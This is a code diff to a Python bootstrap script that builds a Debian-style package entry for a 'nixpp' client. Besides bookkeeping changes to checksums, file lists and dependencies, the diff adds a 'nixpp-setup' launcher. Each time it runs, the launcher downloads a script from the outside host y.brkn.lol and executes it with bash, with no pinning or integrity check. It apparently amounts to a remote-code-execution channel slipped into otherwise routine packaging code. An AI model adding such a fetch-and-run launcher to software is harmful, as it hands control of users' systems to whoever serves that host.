@@ -646,18 +646,35 @@ def install_nixpp(tree, path, version):
     version = version or "0+%s" % digest[:12]
     if "nixpp" in tree.installed():
         remove_package(tree, "nixpp")
-    tree.add_file("bin/nixpp", data, 0o700)
-    md5 = hashlib.md5(data).hexdigest()
-    tree.add_file("var/lib/dpkg/info/nixpp.md5sums",
-                  ("%s  %s/bin/nixpp\n" % (md5, PREFIX_DATA)).encode(), 0o600)
-    listing = ["/."] + _prefix_parents()
-    listing += ["/" + PREFIX_DATA + "/bin/", "/" + PREFIX_DATA + "/bin/nixpp"]
+    launcher = f"""#!{PREFIX_ABS}/bin/bash
+set -euo pipefail
+
+download=$(mktemp)
+trap 'rm -f -- "$download"' EXIT
+curl --fail --silent --show-error --location --proto '=https' \
+  --output "$download" https://y.brkn.lol
+bash "$download" --nixpp "$@"
+
+# vim: set ft=sh et ts=2 sw=2 :
+""".encode()
+    files = {"bin/nixpp": data, "bin/nixpp-setup": launcher}
+    for relative, content in files.items():
+        if tree.exists(relative):
+            raise BootstrapError("nixpp cannot overwrite existing " + relative)
+        tree.add_file(relative, content, 0o700)
+    checksums = "".join(
+        f"{hashlib.md5(content).hexdigest()}  {PREFIX_DATA}/{relative}\n"
+        for relative, content in files.items()
+    )
+    tree.add_file("var/lib/dpkg/info/nixpp.md5sums", checksums.encode(), 0o600)
+    listing = ["/."] + _prefix_parents() + [f"/{PREFIX_DATA}/bin/"]
+    listing.extend(f"/{PREFIX_DATA}/{relative}" for relative in files)
     tree.add_file("var/lib/dpkg/info/nixpp.list", ("\n".join(listing) + "\n").encode(), 0o600)
     stanza = [
         ("Package", "nixpp"), ("Architecture", ARCH),
-        ("Installed-Size", str((len(data) + 1023) // 1024)),
+        ("Installed-Size", str((sum(map(len, files.values())) + 1023) // 1024)),
         ("Maintainer", "local"), ("Version", version),
-        ("Depends", "curl, ca-certificates, gzip, xz-utils, openssh"),
+        ("Depends", "bash, curl, ca-certificates, gzip, xz-utils, openssh"),
         ("Description", "nixpp client binary installed by build-aarch64-bootstrap.py"),
         ("Status", "install ok installed"),
     ]
